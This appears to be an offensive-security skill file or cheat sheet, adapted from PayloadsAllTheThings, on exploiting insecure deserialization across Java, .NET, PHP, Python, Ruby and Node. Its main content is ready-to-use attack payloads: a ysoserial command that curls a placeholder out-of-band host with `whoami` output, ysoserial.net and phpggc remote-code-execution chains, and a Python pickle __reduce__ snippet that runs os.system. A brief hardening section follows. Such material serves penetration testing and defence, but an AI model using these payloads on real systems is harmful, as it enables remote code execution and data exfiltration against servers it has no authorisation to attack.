---
name: insecure-deserialization
description: Exploit unsafe deserialization across Java, .NET, Python, PHP, Ruby, and Node — gadget chains, magic methods, and tools like ysoserial
domain: cybersecurity
subdomain: web-application-security
tags: [deserialization, ysoserial, gadgets, rce]
version: "1.0"
license: MIT
source: PayloadsAllTheThings/Insecure Deserialization
---

# Insecure Deserialization

## Overview
Deserializing attacker-controlled bytes invokes constructors, magic methods, and gadget chains in the available classpath — frequently reaching RCE, SSRF, or auth bypass without needing app-level injection.

## Recognizing Formats
- **Java**: `aced 0005` (binary), or base64 `rO0AB...`. Look for `ObjectInputStream`, RMI, JNDI, JMX, T3 (WebLogic), JBoss invoker.
- **.NET**: `BinaryFormatter`, `SoapFormatter`, `NetDataContractSerializer`, `LosFormatter` (ViewState `__VIEWSTATE`).
- **Python pickle**: starts with `\x80` (protocol byte).
- **PHP**: `O:8:"ClassName":n:{...}` strings; `__wakeup`, `__destruct`.
- **Ruby Marshal**: `\x04\x08...`; YAML.load on untrusted YAML.
- **Node**: `node-serialize` with `_$$ND_FUNC$$_`; `funcster`.

## Java Gadget Chains (ysoserial)
Common payloads: `CommonsCollections1-7`, `CommonsBeanutils1`, `Hibernate1/2`, `Spring1/2`, `Groovy1`, `JRMPClient`, `URLDNS` (blind detection).
```
java -jar ysoserial.jar CommonsCollections5 'curl http://OOB/`whoami`' | base64 -w0
```
Blind verification: `URLDNS` payload — set a DNS interaction host; if resolved → vulnerable.

## .NET (ysoserial.net)
```
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "calc.exe"
ViewState: ysoserial.exe -f LosFormatter -g ActivitySurrogateSelectorFromFile ...
```
Requires `validationKey`+`decryptionKey` — find via leaked `web.config` / blacklanternsecurity badsecrets.

## PHP Magic Methods
`__wakeup`, `__destruct`, `__toString`, `__call`. PHPGGC for chains across Symfony/Laravel/Guzzle/Monolog/Doctrine.
```
phpggc Monolog/RCE1 system id -b
```

## Python Pickle
```python
import pickle, base64, os
class E: 
    def __reduce__(self): return (os.system, ('id',))
print(base64.b64encode(pickle.dumps(E())))
```

## Ruby
- `Marshal.load` on user input → RCE via `Gem::Requirement`, `ActiveSupport::DeprecationProxy` gadgets.
- `YAML.load` (not `safe_load`) → universal RCE.

## Node
- `node-serialize.unserialize` with IIFE function body → immediate execution.
- `funcster` — similar.

## Tools
- **ysoserial** (Java), **ysoserial.net** (.NET), **PHPGGC** (PHP), **marshalsec** (Java + JNDI/LDAP).
- **Java Deserialization Scanner** Burp ext.
- **GadgetProbe** for classpath enumeration.

## Hardening
- Don't deserialize untrusted data. Use JSON with strict schema instead.
- If unavoidable: signed payloads (HMAC), allowlist of types (`LookAheadObjectInputStream`).
- Remove dangerous gadget libs from classpath; keep deps updated.
- `BinaryFormatter` is deprecated in .NET — disable.

## References
- `payloadsallthethings/Insecure Deserialization/README.md`
- ysoserial / PHPGGC / marshalsec project docs; "Java Unmarshaller Security" — Moritz Bechler.
